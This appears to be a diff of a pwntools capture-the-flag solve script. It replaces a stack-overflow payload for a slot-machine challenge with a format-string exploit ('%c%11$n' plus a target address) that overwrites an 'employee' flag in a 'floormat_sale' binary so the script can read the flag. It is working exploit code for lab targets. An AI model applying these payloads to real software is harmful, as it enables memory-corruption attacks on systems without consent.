@@ -1,31 +1,23 @@
 from pwn import *
 
-BINARY = './rigged_slot2'
+BINARY = './floormat_sale'
 HOST = ''
 GDB_SCRIPT = ''
 
-def play_game():
-    proc = get_process() # set is_remote = False for local testing
-
-    payload = b''.join([
-        b'A'*0x14,
-        p64(0x14684c+1), # Chance we will lose a coin, add one in case
-    ])
-
-    proc.sendlineafter(b'Enter your name:', payload)
-    proc.sendlineafter(b': ', b'1')
-
-    return proc
-
 def main():
-    while True: 
-        proc = play_game()
-        line = proc.recvline().strip().decode()
-        if 'You lost $1.' == line:
-            proc.recvuntil(b'You\'ve won the jackpot! Here is your flag: ')
-            flag = proc.recvline().strip().decode()
-            print(f'Flag: {flag}')
-            break
+    proc = get_process() # set is_remote = False for local testing
+    
+    employee_address = 0x0040408c
+    payload = b''.join([
+      b'%c%11$n'.ljust(8, b'\x00'),
+      p64(employee_address),
+    ])
+    
+    proc.sendlineafter(b'Enter your choice:', b'6')
+    proc.sendlineafter(b'Please enter your shipping address:', payload)
+    proc.recvuntil(b'Exclusive Employee-only Mat will be delivered to: ')
+    flag = proc.recvline().strip().decode()
+    print(f'Flag: {flag}')
 
 # Allows compatibility if custom library isn't present
 try:
